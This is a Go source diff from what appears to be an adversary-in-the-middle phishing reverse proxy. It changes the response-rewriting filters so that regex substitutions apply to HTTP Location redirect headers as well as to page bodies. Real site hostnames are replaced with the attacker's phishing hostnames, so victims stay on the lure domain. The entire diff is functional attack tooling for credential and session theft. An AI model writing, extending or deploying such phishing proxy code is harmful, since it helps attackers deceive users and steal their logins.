@@ -1330,38 +1330,53 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										}
 									}
 								}
-								if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
-									re_s := sf.regexp
-									replace_s := sf.replace
-									phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
-									phish_sub, _ := p.getPhishSub(phish_hostname)
-
-									re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
-									re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
-									re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
-									re_s = strings.Replace(re_s, "{basedomain}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
-									re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
-									re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
-									re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
-									re_s = strings.Replace(re_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
-									replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
-									replace_s = strings.Replace(replace_s, "{orig_hostname}", obfuscateDots(combineHost(sf.subdomain, sf.domain)), -1)
-									replace_s = strings.Replace(replace_s, "{orig_domain}", obfuscateDots(sf.domain), -1)
-									replace_s = strings.Replace(replace_s, "{subdomain}", phish_sub, -1)
-									replace_s = strings.Replace(replace_s, "{basedomain}", p.cfg.GetBaseDomain(), -1)
-									replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
-									replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
-									replace_s = strings.Replace(replace_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
-									phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
-									if ok {
-										replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
-										replace_s = strings.Replace(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
+								if (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
+									if stringExists("location", sf.location) && param_ok {
+										if re, err := regexp.Compile(sf.regexp); err == nil {
+											location := resp.Header.Get("Location")
+											if location != "" {
+													location = re.ReplaceAllString(string(location), sf.replace)
+													resp.Header.Set("Location", location)
+											}
+										} else {
+											log.Error("regexp failed to compile: `%s`", sf.regexp)
+										}
 									}
+									if stringExists("body", sf.location) {
+										if stringExists(mime, sf.mime) {
+											re_s := sf.regexp
+											replace_s := sf.replace
+											phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
+											phish_sub, _ := p.getPhishSub(phish_hostname)
 
-									if re, err := regexp.Compile(re_s); err == nil {
-										body = []byte(re.ReplaceAllString(string(body), replace_s))
-									} else {
-										log.Error("regexp failed to compile: `%s`", sf.regexp)
+											re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
+											re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
+											re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
+											re_s = strings.Replace(re_s, "{basedomain}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
+											re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
+											re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
+											re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
+											re_s = strings.Replace(re_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
+											replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
+											replace_s = strings.Replace(replace_s, "{orig_hostname}", obfuscateDots(combineHost(sf.subdomain, sf.domain)), -1)
+											replace_s = strings.Replace(replace_s, "{orig_domain}", obfuscateDots(sf.domain), -1)
+											replace_s = strings.Replace(replace_s, "{subdomain}", phish_sub, -1)
+											replace_s = strings.Replace(replace_s, "{basedomain}", p.cfg.GetBaseDomain(), -1)
+											replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
+											replace_s = strings.Replace(replace_s, "{subdomain_regexp}", regexp.QuoteMeta(phish_sub), -1)
+											replace_s = strings.Replace(replace_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
+											phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
+											if ok {
+												replace_s = strings.Replace(replace_s, "{domain}", phishDomain, -1)
+												replace_s = strings.Replace(replace_s, "{domain_regexp}", regexp.QuoteMeta(phishDomain), -1)
+											}
+
+											if re, err := regexp.Compile(re_s); err == nil {
+												body = []byte(re.ReplaceAllString(string(body), replace_s))
+											} else {
+												log.Error("regexp failed to compile: `%s`", sf.regexp)
+											}
+										}
 									}
 								}
 							}
